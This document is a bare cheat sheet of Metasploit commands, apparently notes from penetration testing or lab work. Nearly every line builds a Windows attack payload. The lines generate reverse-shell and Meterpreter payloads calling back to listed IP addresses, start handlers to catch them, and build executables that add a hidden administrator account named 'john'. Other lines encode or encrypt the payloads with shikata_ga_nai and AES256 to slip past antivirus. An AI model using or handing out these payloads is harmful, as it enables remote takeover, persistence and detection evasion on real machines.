```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.10.110 LPORT=7777 -f raw -o notepad64.bin
msfvenom -p windows/x64/messagebox TITLE="NyaMeeEain" Text="Catch Me If You Can...Shellcode is loading"   -f raw -o raw.bin

msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.100.105 LPORT=7777 -f dll -o  shell.dll
msfconsole -x "use exploits/multi/handler; set lhost 172.16.100.105; set lport 4444; set payload windows/meterpreter/reverse_tcp; exploit"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.100.105 LPORT=7777 -f exe -o 123.exe
msfconsole -x "use exploits/multi/handler; set lhost 172.16.100.105; set lport 7777; set payload windows/x64/meterpreter/reverse_tcp; exploit"



msfvenom -p windows/shell_reverse_tcp -f raw -e x86/alpha_mixed LHOST=10.10.14.47 LPORT=443 > shellcode_rev_10.10.14.47_443
msfvenom -p windows/meterpreter/reverse_tcp  LHOST=10.10.14.47 LPORT=443 -f raw -e x86/alpha_mixed > shellcode_msf_10.10.14.47_443
msfvenom -p windows/adduser USER=john PASS=Password123! -f exe-service -a x86 --platform win > adduser.exe

msfvenom -p windows/x64/exec CMD="cmd.exe /c \"net user john Password123! /add && net localgroup administrators john /add\"" -f exe-service > adduser.exe

```
```
msfvenom --payload windows/x64/exec CMD=calc.exe -a x64 --platform windows -f raw -o calc64.bin
msfvenom --payload windows/x64/exec CMD=notepad.exe -a x64 --platform windows -f raw -o notepad64.bin
msfvenom --payload windows/exec CMD=notepad.exe -a x86 --platform windows -f raw -o notepad32.bin
msfvenom --payload windows/exec CMD=calc.exe -a x86 --platform windows -f raw -o calc32.bin
```

```
msfvenom --list encrypt
msfvenom --encrypt aes256 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe

msfvenom --list encoders
msfvenom --platform Windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=10.10.10.10 LPORT=4545 -f exe > encoded_shell.exe
```
